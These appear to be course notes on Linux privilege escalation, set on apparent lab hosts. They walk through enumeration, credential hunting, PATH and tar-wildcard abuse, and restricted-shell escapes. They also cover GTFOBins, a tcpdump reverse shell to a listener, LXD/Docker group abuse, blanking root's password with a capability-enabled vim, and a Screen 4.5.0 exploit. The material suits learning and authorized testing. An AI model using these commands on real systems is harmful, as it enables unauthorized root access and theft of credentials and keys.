# Linux Privilege Escalation

## 1.Introduction to Linux Privilege Escalation

* `whoami` - what user are we running as
* `id` - what groups does our user belong to?
* `hostname` - what is the server named, can we gather anything from the naming convention?
* `ifconfig` or `ip a` - what subnet did we land in, does the host have additional NICs in other subnets?
* `sudo -l` - can our user run anything with sudo (as another user as root) without needing a password? This can sometimes be the easiest win and we can do something like `sudo su` and drop right into a root shell.

## Enumeration

> OS Version , Kernel Version , Running Services

### List Current Processes

```shell-session
ps aux | grep root
```

> Installed Packages and Versions , Logged in Users

### List Current Processes

```shell-session
ps au
```

> User Home Directories Are other user's home directories accessible? User home folders may also contain SSH keys that can be used to access other systems or scripts and configuration files containing credentials.

### Home Directory Contents

```shell-session
ls /home

backupsvc  bob.jones  cliff.moore  logger  mrb3n  shared  stacey.jenkins
```

> We can check individual user directories and check to see if files such as the `.bash_history` file are readable and contain any interesting commands, look for configuration files, and check to see if we can obtain copies of a user's SSH keys.

### User's Home Directory Contents

```shell-session
ls -la /home/stacey.jenkins/

total 32
drwxr-xr-x 3 stacey.jenkins stacey.jenkins 4096 Aug 30 23:37 .
drwxr-xr-x 9 root           root           4096 Aug 30 23:33 ..
-rw------- 1 stacey.jenkins stacey.jenkins   41 Aug 30 23:35 .bash_history
-rw-r--r-- 1 stacey.jenkins stacey.jenkins  220 Sep  1  2015 .bash_logout
-rw-r--r-- 1 stacey.jenkins stacey.jenkins 3771 Sep  1  2015 .bashrc
-rw-r--r-- 1 stacey.jenkins stacey.jenkins   97 Aug 30 23:37 config.json
-rw-r--r-- 1 stacey.jenkins stacey.jenkins  655 May 16  2017 .profile
drwx------ 2 stacey.jenkins stacey.jenkins 4096 Aug 30 23:35 .ssh
```

> If you find an SSH key for your current user, this could be used to open an SSH session on the host (if SSH is exposed externally) and gain a stable and fully interactive session. SSH keys could be leveraged to access other systems within the network as well.

### SSH Directory Contents

```shell-session
ls -l ~/.ssh

total 8
-rw------- 1 mrb3n mrb3n 1679 Aug 30 23:37 id_rsa
-rw-r--r-- 1 mrb3n mrb3n  393 Aug 30 23:37 id_rsa.pub
```

### Bash History

```shell-session
history
```

```shell-session
    1  id
    2  cd /home/cliff.moore
    3  exit
    4  touch backup.sh
    5  tail /var/log/apache2/error.log
    6  ssh ec2-user@dmz02.inlanefreight.local
    7  history
```

> Sudo Privileges

### Sudo - List User's Privileges

```shell-session
sudo -l
```

> `Configuration Files`: Configuration files can hold a wealth of information. It is worth searching through all files that end in extensions such as `.conf` and `.config`, for usernames, passwords, and other secrets.
>
> `Readable Shadow File`: If the shadow file is readable, you will be able to gather password hashes for all users who have a password set. While this does not guarantee further access, these hashes can be subjected to an offline brute-force attack to recover the cleartext password.
>
> `Password Hashes in /etc/passwd`: Occasionally, you will see password hashes directly in the /etc/passwd file. This file is readable by all users, and as with hashes in the `shadow` file, these can be subjected to an offline password cracking attack. This configuration, while not common, can sometimes be seen on embedded devices and routers.

### Passwd

```shell-session
cat /etc/passwd
```

> `Cron Jobs`

### **Cron Jobs**

```shell-session
ls -la /etc/cron.daily/
```

> `Unmounted File Systems and Additional Drives`: If you discover and can mount an additional drive or unmounted file system, you may find sensitive files, passwords, or backups that can be leveraged to escalate privileges.

### File Systems & Additional Drives

```shell-session
lsblk

NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda      8:0    0   30G  0 disk 
├─sda1   8:1    0   29G  0 part /
├─sda2   8:2    0    1K  0 part 
└─sda5   8:5    0  975M  0 part [SWAP]
sr0     11:0    1  848M  0 rom  
```

> `SETUID and SETGID Permissions`: Binaries are set with these permissions to allow a user to run a command as root, without having to grant root-level access to the user. Many binaries contain functionality that can be exploited to get a root shell.
>
> `Writeable Directories`: It is important to discover which directories are writeable if you need to download tools to the system. You may discover a writeable directory where a cron job places files, which provides an idea of how often the cron job runs and could be used to elevate privileges if the script that the cron job runs is also writeable.

### **Find Writable Directories**

```shell-session
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```

> `Writeable Files`: Are any scripts or configuration files world-writable? While altering configuration files can be extremely destructive, there may be instances where a minor modification can open up further access. Also, any scripts that are run as root using cron jobs can be modified slightly to append a command.

### Find Writable Files

```shell-session
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```


# Environment - Services Internal Enumeration - Credential Hunting

## 1.Environment Enumeration

> OS Version\
> Kernel Version
>
> Running Services

## Gaining Situational Awareness

Typically we'll want to run a few basic commands to orient ourselves:

* `whoami` - what user are we running as
* `id` - what groups does our user belong to?
* `hostname` - what is the server named, can we gather anything from the naming convention?
* `ifconfig` or `ip a` - what subnet did we land in, does the host have additional NICs in other subnets?
* `sudo -l` - can our user run anything with sudo (as another user as root) without needing a password? This can sometimes be the easiest win and we can do something like `sudo su` and drop right into a root shell.

***

**We'll start out by checking out what operating system and version we are dealing with.**

```shell-session
cat /etc/os-release
```

```shell-session
echo $PATH
```

> We can also check out all environment variables that are set for our current user, we may get lucky and find something sensitive in there such as a password. We'll note this down and move on.

```shell-session
env
```

> Next let's note down the Kernel version. We can do some searches to see if the target is running a vulnerable Kernel (which we'll get to take advantage of later on in the module) which has some known public exploit PoC.&#x20;

```shell-session
cat /proc/version
uname -a
```

> We can next gather some additional information about the host itself such as the CPU type/version:.

```shell-session
lscpu
```

> What login shells exist on the server? Note these down and highlight that both Tmux and Screen are available to us.

```shell-session
cat /etc/shells

# /etc/shells: valid login shells
/bin/sh
/bin/bash
/usr/bin/bash
/bin/rbash
/usr/bin/rbash
/bin/dash
/usr/bin/dash
/usr/bin/tmux
/usr/bin/screen
```

We should also check to see if any defenses are in place and we can enumerate any information about them. Some things to look for include:

* [Exec Shield](https://en.wikipedia.org/wiki/Exec_Shield)
* [iptables](https://linux.die.net/man/8/iptables)
* [AppArmor](https://apparmor.net/)
* [SELinux](https://www.redhat.com/en/topics/linux/what-is-selinux)
* [Fail2ban](https://github.com/fail2ban/fail2ban)
* [Snort](https://www.snort.org/faq/what-is-snort)
* [Uncomplicated Firewall (ufw)](https://wiki.ubuntu.com/UncomplicatedFirewall)

> Next we can take a look at the drives and any shares on the system.

```shell-session
lsblk
```

> The command `lpstat` can be used to find information about any printers attached to the system. If there are active or queued print jobs can we gain access to some sort of sensitive information?
>
> We should also check for mounted drives and unmounted drives. Can we mount an umounted drive and gain access to sensitive data? Can we find any types of credentials in `fstab` for mounted drives by grepping for common words such as password, username, credential, etc in `/etc/fstab`?

```shell-session
cat /etc/fstab
```

> Check out the routing table by typing `route` or `netstat -rn`. Here we can see what other networks are available via which interface.

```shell-session
route
```

> In a domain environment we'll definitely want to check `/etc/resolv.conf` if the host is configured to use internal DNS we may be able to use this as a starting point to query the Active Directory environment.
>
> We'll also want to check the arp table to see what other hosts the target has been communicating with.

```shell-session
arp -a
```

> The environment enumeration also includes knowledge about the users that exist on the target system. This is because individual users are often configured during the installation of applications and services to limit the service's privileges. The reason for this is to maintain the security of the system itself. Because if a service is running with the highest privileges (`root`) and this is brought under control by an attacker, the attacker automatically has the highest rights over the entire system. All users on the system are stored in the `/etc/passwd` file. The format gives us some information, such as:
>
> 1. Username
> 2. Password
> 3. User ID (UID)
> 4. Group ID (GID)
> 5. User ID info
> 6. Home directory
> 7. Shell

### Existing Users

```shell-session
cat /etc/passwd
```

> Occasionally, we will see password hashes directly in the `/etc/passwd` file. This file is readable by all users, and as with hashes in the `/etc/shadow` file, these can be subjected to an offline password cracking attack. This configuration, while not common, can sometimes be seen on embedded devices and routers.

```shell-session
cat /etc/passwd | cut -f1 -d:
```

> With Linux, several different hash algorithms can be used to make the passwords unrecognizable. Identifying them from the first hash blocks can help us to use and work with them later if needed. Here is a list of the most used ones:

| **Algorithm** | **Hash**       |
| ------------- | -------------- |
| Salted MD5    | `$1$`...       |
| SHA-256       | `$5$`...       |
| SHA-512       | `$6$`...       |
| BCrypt        | `$2a$`...      |
| Scrypt        | `$7$`...       |
| Argon2        | `$argon2i$`... |

> We'll also want to check which users have login shells. Once we see what shells are on the system, we can check each version for vulnerabilities. Because outdated versions, such as Bash version 4.1, are vulnerable to a `shellshock` exploit.

```shell-session
 grep "sh$" /etc/passwd
```

### **Existing Groups**

```shell-session
cat /etc/group
```

> The `/etc/group` file lists all of the groups on the system. We can then use the [getent](https://man7.org/linux/man-pages/man1/getent.1.html) command to list members of any interesting groups.

```shell-session
getent group sudo
```

> We can also check out which users have a folder under the `/home` directory. We'll want to enumerate each of these to see if any of the system users are storing any sensitive data, files containing passwords. We should check to see if files such as the `.bash_history` file are readable and contain any interesting commands and look for configuration files. It is not uncommon to find files containing credentials that can be leveraged to access other systems or even gain entry into the Active Directory environment. Its also important to check for SSH keys for all users, as these could be used to achieve persistence on the system, potentially to escalate privileges, or to assist with pivoting and port forwarding further into the internal network. At the minimum, check the ARP cache to see what other hosts are being accessed and cross-reference these against any useable SSH private keys.

```shell-session
ls /home

administrator.ilfreight  bjones       htb-student  mrb3n   stacey.jenkins
backupsvc                cliff.moore  logger       shared
```

> Finally, we can search for any "low hanging fruit" such as config files, and other files that may contain sensitive information. Configuration files can hold a wealth of information. It is worth searching through all files that end in extensions such as .conf and .config, for usernames, passwords, and other secrets.

### **Mounted File Systems**

```shell-session
df -h
```

### Unmounted File Systems

```shell-session
cat /etc/fstab | grep -v "#" | column -t
```

### **All Hidden Files**

```shell-session
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
```

### All Hidden Directories

```shell-session
find / -type d -name ".*" -ls 2>/dev/null
```

> Both `/tmp` and `/var/tmp` are used to store data temporarily.

### Temporary Files

```shell-session
ls -l /tmp /var/tmp /dev/shm
```

***

## 2.Linux Services & Internals Enumeration

> * What services and applications are installed?
> * What services are running?
> * What sockets are in use?
> * What users, admins, and groups exist on the system?
> * Who is current logged in? What users recently logged in?
> * What password policies, if any, are enforced on the host?
> * Is the host joined to an Active Directory domain?
> * What types of interesting information can we find in history, log, and backup files
> * Which files have been modified recently and how often? Are there any interesting patterns in file modification that could indicate a cron job in use that we may be able to hijack?
> * Current IP addressing information
> * Anything interesting in the `/etc/hosts` file?
> * Are there any interesting network connections to other systems in the internal network or even outside the network?
> * What tools are installed on the system that we may be able to take advantage of? (Netcat, Perl, Python, Ruby, Nmap, tcpdump, gcc, etc.)
> * Can we access the `bash_history` file for any users and can we uncover any thing interesting from their recorded command line history such as passwords?
> * Are any Cron jobs running on the system that we may be able to hijack?

## Internals

### Network Interfaces

```shell-session
ip a
```

### Hosts

```shell-session
cat /etc/hosts
```

### User's Last Login

```shell-session
lastlog
```

### Logged In Users

```shell-session
w
who
```

### Command History

```shell-session
history
```

### Finding History Files

```shell-session
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```

### **Cron**

```shell-session
ls -la /etc/cron.daily/
```

> The [proc filesystem](https://man7.org/linux/man-pages/man5/proc.5.html) (`proc` / `procfs`) is a particular filesystem in Linux that contains information about system processes, hardware, and other system information.

### **Proc**

```shell-session
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
```

## Services

### **Installed Packages**

```shell-session
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
```

### Sudo Version

```shell-session
sudo -V
```

### Binaries

```shell-session
ls -l /bin /usr/bin/ /usr/sbin/
```

* <https://gtfobins.github.io/>

### &#x20;**GTFObins**

```shell-session
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
```

> We can use the diagnostic tool `strace` on Linux-based operating systems to track and analyze system calls and signal processing. It allows us to follow the flow of a program and understand how it accesses system resources, processes signals, and receives and sends data from the operating system.

### **Trace System Calls**

```shell-session
strace ping -c1 10.129.112.20
```

### Configuration Files

```shell-session
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
```

### Scripts

```shell-session
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```

### Running Services by User

```shell-session
ps aux | grep root
```

***

## 3.Credential Hunting

> When enumerating a system, it is important to note down any credentials. These may be found in configuration files (`.conf`, `.config`, `.xml`, etc.), shell scripts, a user's bash history file, backup (`.bak`) files, within database files or even in text files. Credentials may be useful for escalating to other users or even root, accessing databases and other systems within the environment.
>
> The /var directory typically contains the web root for whatever web server is running on the host. The web root may contain database credentials or other types of credentials that can be leveraged to further access. A common example is MySQL database credentials within WordPress configuration files:

```shell-session
grep 'DB_USER\|DB_PASSWORD' wp-config.php
```

```shell-session
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

## SSH Keys

```shell-session
ls ~/.ssh

id_rsa  id_rsa.pub  known_hosts
```


# Environment-based Privilege Escalation

## 1.Path Abuse

> [PATH](http://www.linfo.org/path_env_var.html) is an environment variable that specifies the set of directories where an executable can be located. An account's PATH variable is a set of absolute paths, allowing a user to type a command without specifying the absolute path to the binary. For example, a user can type `cat /tmp/test.txt` instead of specifying the absolute path `/bin/cat /tmp/test.txt`. We can check the contents of the PATH variable by typing `env | grep PATH` or `echo $PATH`.

```shell-session
echo $PATH
```

```shell-session
pwd && conncheck 
```

> As shown below, the `conncheck` script created in `/usr/local/sbin` will still run when in the `/tmp` directory because it was created in a directory specified in the PATH.

> Adding `.` to a user's PATH adds their current working directory to the list. For example, if we can modify a user's path, we could replace a common binary such as `ls` with a malicious script such as a reverse shell. If we add `.` to the path by issuing the command `PATH=.:$PATH` and then `export PATH`, we will be able to run binaries located in our current working directory by just typing the name of the file (i.e. just typing `ls` will call the malicious script named `ls` in the current working directory instead of the binary located at `/bin/ls`).

```shell-session
echo $PATH
```

```
PATH=.:${PATH}
export PATH
cho $PATH
```

> In this example, we modify the path to run a simple `echo` command when the command `ls` is typed.

```shell-session
touch ls
echo 'echo "PATH ABUSE!!"' > ls
chmod +x ls
```

```shell-session
ls
```

***

## 2.Wildcard Abuse

> A wildcard character can be used as a replacement for other characters and are interpreted by the shell before other actions. Examples of wild cards include:

| **Character** | **Significance**                                                                                                                                      |
| ------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| `*`           | An asterisk that can match any number of characters in a file name.                                                                                   |
| `?`           | Matches a single character.                                                                                                                           |
| `[ ]`         | Brackets enclose characters and can match any single one at the defined position.                                                                     |
| `~`           | A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory. |
| `-`           | A hyphen within brackets will denote a range of characters.                                                                                           |

> An example of how wildcards can be abused for privilege escalation is the `tar` command, a common program for creating/extracting archives. If we look at the [man page](http://man7.org/linux/man-pages/man1/tar.1.html) for the `tar` command, we see the following:

```shell-session
man tar
```

> The `--checkpoint-action` option permits an `EXEC` action to be executed when a checkpoint is reached (i.e., run an arbitrary operating system command once the tar command executes.) By creating files with these names, when the wildcard is specified, `--checkpoint=1` and `--checkpoint-action=exec=sh root.sh` is passed to `tar` as command-line options. Let's see this in practice.
>
> Consider the following cron job, which is set up to back up the `/home/htb-student` directory's contents and create a compressed archive within `/home/htb-student`. The cron job is set to run every minute, so it is a good candidate for privilege escalation.

```shell-session
#
#
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

> We can leverage the wild card in the cron job to write out the necessary commands as file names with the above in mind. When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify.

```shell-session
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

```shell-session
ls -la
```

> Once the cron job runs again, we can check for the newly added sudo privileges and sudo to root directly.

```shell-session
sudo -l
```

***

## 3.Escaping Restricted Shells

> A restricted shell is a type of shell that limits the user's ability to execute commands. In a restricted shell, the user is only allowed to execute a specific set of commands or only allowed to execute commands in specific directories. Restricted shells are often used to provide a safe environment for users who may accidentally or intentionally damage the system or provide a way for users to access only certain system features. Some common examples of restricted shells include the `rbash` shell in Linux and the "Restricted-access Shell" in Windows.

> **RBASH**
>
> [Restricted Bourne shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html) (`rbash`) is a restricted version of the Bourne shell, a standard command-line interpreter in Linux which limits the user's ability to use certain features of the Bourne shell, such as changing directories, setting or modifying environment variables, and executing commands in other directories. It is often used to provide a safe and controlled environment for users who may accidentally or intentionally damage the system.
>
> **RKSH**
>
> [Restricted Korn shell](https://www.ibm.com/docs/en/aix/7.2?topic=r-rksh-command) (`rksh`) is a restricted version of the Korn shell, another standard command-line interpreter. The `rksh` shell limits the user's ability to use certain features of the Korn shell, such as executing commands in other directories, creating or modifying shell functions, and modifying the shell environment.
>
> **RZSH**
>
> [Restricted Z shell](https://manpages.debian.org/experimental/zsh/rzsh.1.en.html) (`rzsh`) is a restricted version of the Z shell and is the most powerful and flexible command-line interpreter. The `rzsh` shell limits the user's ability to use certain features of the Z shell, such as running shell scripts, defining aliases, and modifying the shell environment.
>
> For example, administrators often use restricted shells in enterprise networks to provide a safe and controlled environment for users who may accidentally or intentionally damage the system. By limiting the user's ability to execute specific commands or access certain directories, administrators can ensure that users cannot perform actions that could harm the system or compromise the network's security. Additionally, restricted shells can give users access to only certain system features, allowing administrators to control which resources and functions are available to each user.
>
> Imagine a company with a network of Linux servers hosting critical business applications and services. Many users, including employees, contractors, and external partners, access the network. To protect the security and integrity of the network, the organization's IT team decided to implement restricted shells for all users.
>
> To do this, the IT team sets up several `rbash`, `rksh`, and `rzsh` shells on the network and assigns each user to a specific shell. For example, external partners who need to access only certain network features, such as email and file sharing, are assigned to `rbash` shells, which limits their ability to execute specific commands and access certain directories. Contractors who need to access more advanced network features, such as database servers and web servers, are assigned to `rksh` shells, which provide them with more flexibility but still limit their abilities. Finally, employees who need to access the network for specific purposes, such as to run specific applications or scripts, are assigned to `rzsh` shells, which provide them with the most flexibility but still limit their ability to execute specific commands and access certain directories.
>
> Several methods can be used to escape from a restricted shell. Some of these methods involve exploiting vulnerabilities in the shell itself, while others involve using creative techniques to bypass the restrictions imposed by the shell. Here are a few examples of methods that can be used to escape from a restricted shell.

## Escaping

### **Command injection**

```shell-session
ls -l `pwd`
```

> This command would cause the `ls` command to be executed with the argument `-l`, followed by the output of the `pwd` command. Since the `pwd` command is not restricted by the shell, this would allow us to execute the `pwd` command and see the current working directory, even though the shell does not allow us to execute the `pwd` command directly.
>
> **Command Substitution**
>
> Another method for escaping from a restricted shell is to use command substitution. This involves using the shell's command substitution syntax to execute a command. For example, imagine the shell allows users to execute commands by enclosing them in backticks (\`). In that case, it may be possible to escape from the shell by executing a command in a backtick substitution that is not restricted by the shell.
>
> **Command Chaining**
>
> In some cases, it may be possible to escape from a restricted shell by using command chaining. We would need to use multiple commands in a single command line, separated by a shell metacharacter, such as a semicolon (`;`) or a vertical bar (`|`), to execute a command. For example, if the shell allows users to execute commands separated by semicolons, it may be possible to escape from the shell by using a semicolon to separate two commands, one of which is not restricted by the shell.
>
> **Environment Variables**
>
> For escaping from a restricted shell to use environment variables involves modifying or creating environment variables that the shell uses to execute commands that are not restricted by the shell. For example, if the shell uses an environment variable to specify the directory in which commands are executed, it may be possible to escape from the shell by modifying the value of the environment variable to specify a different directory.
>
> **Shell Functions**
>
> In some cases, it may be possible to escape from a restricted shell by using shell functions. For this we can define and call shell functions that execute commands not restricted by the shell. Let us say, the shell allows users to define and call shell functions, it may be possible to escape from the shell by defining a shell function that executes a command.

# Permissions-based Privilege Escalation

## 1.Special Permissions

> The `Set User ID upon Execution` (`setuid`) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The `setuid` bit appears as an `s`.

```shell-session
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

> The Set-Group-ID (setgid) permission is another special permission that allows us to run binaries as if we were part of the group that created them. These files can be enumerated using the following command: `find / -uid 0 -perm -6000 -type f 2>/dev/null`. These files can be leveraged in the same manner as `setuid` binaries to escalate privileges.

```shell-session
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

> This [resource](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits) has more information about the `setuid` and `setgid` bits, including how to set the bits.

## GTFOBins

* <https://gtfobins.github.io/>

```shell-session
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

```shell-session
# id
uid=0(root) gid=0(root) groups=0(root)
```

> It is worth familiarizing ourselves with as many GTFOBins as possible to quickly identify misconfigurations when we land on a system that we must escalate our privileges to move further.

***

## 2.Sudo Rights Abuse

```shell-session
sudo -l
```

> It is easy to misconfigure this. For example, a user may be granted root-level permissions without requiring a password. Or the permitted command line might be specified too loosely, allowing us to run a program in an unintended way, resulting in privilege escalation. For example, if the sudoers file is edited to grant a user the right to run a command such as `tcpdump` per the following entry in the sudoers file: `(ALL) NOPASSWD: /usr/sbin/tcpdump` an attacker could leverage this to take advantage of a the **postrotate-command** option.

```shell-session
 man tcpdump
```

> By specifying the `-z` flag, an attacker could use `tcpdump` to execute a shell script, gain a reverse shell as the root user or run other privileged commands. For example, an attacker could create the shell script `.test` containing a reverse shell and execute it as follows:

```shell-session
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

> Let's try this out. First, make a file to execute with the `postrotate-command`, adding a simple reverse shell one-liner.

```shell-session
cat /tmp/.test
```

> Next, start a `netcat` listener on our attacking box and run `tcpdump` as root with the `postrotate-command`. If all goes to plan, we will receive a root reverse shell connection.

```shell-session
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

> We receive a root shell almost instantly.

```shell-session
nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38938
bash: cannot set terminal process group (10797): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id && hostname               
id && hostname
uid=0(root) gid=0(root) groups=0(root)
NIX02
```

### AppMirror

[AppArmor](https://wiki.ubuntu.com/AppArmor) in more recent distributions has predefined the commands used with the `postrotate-command`, effectively preventing command execution. Two best practices that should always be considered when provisioning `sudo` rights:

|    |                                                                                                                                                                                                                                                                                                                                                                   |
| -- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1. | Always specify the absolute path to any binaries listed in the `sudoers` file entry. Otherwise, an attacker may be able to leverage PATH abuse (which we will see in the next section) to create a malicious binary that will be executed when the command runs (i.e., if the `sudoers` entry specifies `cat` instead of `/bin/cat` this could likely be abused). |
| 2. | Grant `sudo` rights sparingly and based on the principle of least privilege. Does the user need full `sudo` rights? Can they still perform their job with one or two entries in the `sudoers` file? Limiting the privileged command that a user can run will greatly reduce the likelihood of successful privilege escalation.                                    |

***

## 3.Privileged Groups

> LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at `/mnt/root`. Let's confirm group membership and use these rights to escalate to root.

## LXC / LXD

```shell-session
id
```

> Unzip the Alpine image.

```shell-session
unzip alpine.zip 
```

Start the LXD initialization process. Choose the defaults for each prompt. Consult this [post](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) for more information on each step.

```shell-session
lxd init
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

```shell-session
 lxc init alpine r00t -c security.privileged=true
```

```shell-session
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```

> Finally, spawn a shell inside the container instance. We can now browse the mounted host file system as root. For example, to access the contents of the root directory on the host type `cd /mnt/root/root`. From here we can read sensitive files such as `/etc/shadow` and obtain password hashes or gain access to SSH keys in order to connect to the host system as root, and more.

```shell-session
devops@NIX02:~$ lxc start r00t
devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh
```

### Docker

Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. One example would be running the command `docker run -v /root:/mnt -it ubuntu`. This command creates a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as `/etc` which could be used to retrieve the contents of the `/etc/shadow` file for offline password cracking or adding a privileged user.

### Disk

Users within the disk group have full access to any devices contained within `/dev`, such as `/dev/sda1`, which is typically the main device used by the operating system. An attacker with these privileges can use `debugfs` to access the entire file system with root level privileges. As with the Docker group example, this could be leveraged to retrieve SSH keys, credentials or to add a user.

### ADM

Members of the adm group are able to read all logs stored in `/var/log`. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.

```shell-session
id
```

***

## 4.Capabilities

### **Set Capability**

```shell-session
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

> Some capabilities, such as `cap_sys_admin`, which allows an executable to perform actions with administrative privileges, can be dangerous if they are not used properly. For example, we could exploit them to escalate their privileges, gain access to sensitive information, or perform unauthorized actions. Therefore, it is crucial to set these types of capabilities for properly sandboxed and isolated executables and avoid granting them unnecessarily.

| **Capability**         | **Description**                                                                                                                                           |
| ---------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `cap_sys_admin`        | Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.                                     |
| `cap_sys_chroot`       | Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.            |
| `cap_sys_ptrace`       | Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes. |
| `cap_sys_nice`         | Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.               |
| `cap_sys_time`         | Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.                |
| `cap_sys_resource`     | Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.       |
| `cap_sys_module`       | Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.      |
| `cap_net_bind_service` | Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.                         |

> When a binary is executed with capabilities, it can perform the actions that the capabilities allow. However, it will not be able to perform any actions not allowed by the capabilities. This allows for more fine-grained control over the binary's privileges and can help prevent security vulnerabilities and unauthorized access to sensitive information.
>
> When using the `setcap` command to set capabilities for an executable in Linux, we need to specify the capability we want to set and the value we want to assign. The values we use will depend on the specific capability we are setting and the privileges we want to grant to the executable.
>
> Here are some examples of values that we can use with the `setcap` command, along with a brief description of what they do:

| **Capability Values** | **Description**                                                                                                                                                                                                                                                                                                                                                                                                               |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `=`                   | This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.                                                                                                                                                                                                                                        |
| `+ep`                 | This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.                                                                                                                                                    |
| `+ei`                 | This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.                                                                                                                                    |
| `+p`                  | This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it. |

> Several Linux capabilities can be used to escalate a user's privileges to `root`, including:

| **Capability**     | **Description**                                                                                                                                                                                                              |
| ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `cap_setuid`       | Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the `root` user.                                                                                          |
| `cap_setgid`       | Allows to set its effective group ID, which can be used to gain the privileges of another group, including the `root` group.                                                                                                 |
| `cap_sys_admin`    | This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the `root` user, such as modifying system settings and mounting and unmounting file systems. |
| `cap_dac_override` | Allows bypassing of file read, write, and execute permission checks.                                                                                                                                                         |

## Enumerating Capabilities

```shell-session
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

### Exploitation

```shell-session
getcap /usr/bin/vim.basic
```

> For example, the `/usr/bin/vim.basic` binary is run without special privileges, such as with `sudo`. However, because the binary has the `cap_dac_override` capability set, it can escalate the privileges of the user who runs it. This would allow the penetration tester to gain the `cap_dac_override` capability and perform tasks that require this capability.

```shell-session
cat /etc/passwd | head -n1
```

> We can use the `cap_dac_override` capability of the `/usr/bin/vim` binary to modify a system file:

```shell-session
/usr/bin/vim.basic /etc/passwd
```

> We also can make these changes in a non-interactive mode:

```shell-session
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
cat /etc/passwd | head -n1
```

> Now, we can see that the `x` in that line is gone, which means that we can use the command `su` to log in as root without being asked for the password.


# Service-based Privilege Escalation

## 1.Vulnerable Services

> Many services may be found, which have flaws that can be leveraged to escalate privileges. An example is the popular terminal multiplexer [Screen](https://linux.die.net/man/1/screen). Version 4.5.0 suffers from a privilege escalation vulnerability due to a lack of a permissions check when opening a log file.

### **Screen Version Identification**

```shell-session
screen -v
```

### **Privilege Escalation - Screen\_Exploit.sh**

```shell-session
./screen_exploit.sh 

~ gnu/screenroot ~
[+] First, we create our shell and library...
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /run/screen/S-mrb3n.

# id
